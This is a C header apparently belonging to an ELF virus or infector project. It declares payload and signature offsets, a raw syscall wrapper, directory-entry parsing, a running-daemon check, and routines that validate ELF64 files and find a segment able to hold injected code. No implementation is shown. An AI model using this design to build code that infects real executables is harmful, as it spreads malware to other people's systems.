//
// Created by tblaudez on 1/10/22.
//

#pragma once

#include <sys/syscall.h> // __NR_write
#include <unistd.h> // STDERR_FILENO
#include <sys/types.h> // __ino64_t
#include <stdbool.h> // bool
#include <elf.h> // Elf64_Phdr

#define PAYLOAD_SIZE ((int)(end - _start))
#define SIGNATURE_SIZE 32
#define SIGNATURE_OFFSET ((int)(signature - (char*)_start))
#define PAYLOAD_ENTRY_OFFSET ((int)(SIGNATURE_OFFSET + SIGNATURE_SIZE))
#define HOST_ENTRY_OFFSET ((int)(PAYLOAD_ENTRY_OFFSET + 8))

// ASM variables
extern void _start(void); // NOLINT(bugprone-reserved-identifier)
extern void end(void);
extern const char signature[];

// ASM functions
long syscall_wrapper(long syscall, ...);
size_t ft_strlen(const char *s);
char *ft_strcpy(char *dst, const char *src);
void *ft_memcpy(void *dest, const void *src, size_t n);
void *ft_memmem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen);

struct __attribute__ ((packed)) linux_dirent64 {
	__ino64_t d_ino;    /* 64-bit inode number */
	__off64_t d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char d_type;   /* File type */
	char d_name[]; /* Filename (null-terminated) */
};

bool DaemonProcessRunning(const char *procDirectory);
bool isValidElf64(const Elf64_Ehdr *ehdr);
Elf64_Phdr *findUsableSegment(Elf64_Phdr *phdr, Elf64_Half e_phnum);
